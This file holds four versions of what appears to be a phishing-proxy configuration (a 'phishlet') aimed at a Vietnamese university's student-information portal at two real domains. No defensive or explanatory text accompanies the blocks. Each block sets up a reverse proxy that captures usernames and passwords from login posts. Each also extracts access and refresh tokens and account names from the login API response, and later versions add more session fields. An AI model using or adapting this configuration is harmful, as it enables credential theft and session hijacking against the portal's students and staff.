```
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: "", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", session: true, is_landing: true}

sub_filters:
  - {triggers_on: "thongtindaotao.sgu.edu.vn", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", search: "thongtindaotao.sgu.edu.vn", replace: "thongtindaotao.sgu.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}

auth_tokens:
  - domain: thongtindaotao.sgu.edu.vn
    path: '/api/web/w-geturlsaulogin'
    name: 'access_token'
    header: 'authorization'
    type: 'http'

credentials:
  username:
    key: "username"
    search: '(.*)'
    type: 'post'
  password:
    key: "password"
    search: '(.*)'
    type: 'post'

login:
  domain: thongtindaotao.sgu.edu.vn
  path: /
```










```
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: "", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", session: true, is_landing: true}

sub_filters:
  - {triggers_on: "thongtindaotao.sgu.edu.vn", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", search: "thongtindaotao.sgu.edu.vn", replace: "thongtindaotao.sgu.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}

auth_tokens:
  - domain: thongtindaotao.sgu.edu.vn
    path: '/api/auth/login'
    name: 'access_token'
    search: '"access_token":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.sgu.edu.vn
    path: '/api/auth/login'
    name: 'refresh_token'
    search: '"refresh_token":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.sgu.edu.vn
    path: '/api/auth/login'
    name: 'userName'
    search: '"userName":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.sgu.edu.vn
    path: '/api/auth/login'
    name: 'name'
    search: '"name":"([^"]*)'
    type: 'body'

credentials:
  username:
    key: "username"
    search: '(.*)'
    type: 'post'
  password:
    key: "password"
    search: '(.*)'
    type: 'post'

login:
  domain: thongtindaotao.sgu.edu.vn
  path: /
```

```
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: "", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", session: true, is_landing: true}

sub_filters:
  - {triggers_on: "thongtindaotao.daihocsaigon.edu.vn", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", search: "thongtindaotao.daihocsaigon.edu.vn", replace: "thongtindaotao.daihocsaigon.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}

auth_tokens:
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'access_token'
    search: '"access_token":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'refresh_token'
    search: '"refresh_token":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'userName'
    search: '"userName":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'name'
    search: '"name":"([^"]*)'
    type: 'body'

credentials:
  username:
    key: "username"
    search: '(.*)'
    type: 'post'
  password:
    key: "password"
    search: '(.*)'
    type: 'post'

login:
  domain: thongtindaotao.daihocsaigon.edu.vn
  path: /
```

```
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: "", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", session: true, is_landing: true}

sub_filters:
  - {triggers_on: "thongtindaotao.daihocsaigon.edu.vn", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", search: "thongtindaotao.daihocsaigon.edu.vn", replace: "thongtindaotao.daihocsaigon.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}

auth_tokens:
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'access_token'
    search: '"access_token":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'refresh_token'
    search: '"refresh_token":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'userName'
    search: '"userName":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'name'
    search: '"name":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'expires'
    search: '".expires":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'issued'
    search: '".issued":"([^"]*)'
    type: 'body'

credentials:
  username:
    key: "username"
    search: '(.*)'
    type: 'post'
  password:
    key: "password"
    search: '(.*)'
    type: 'post'

login:
  domain: thongtindaotao.daihocsaigon.edu.vn
  path: /
```
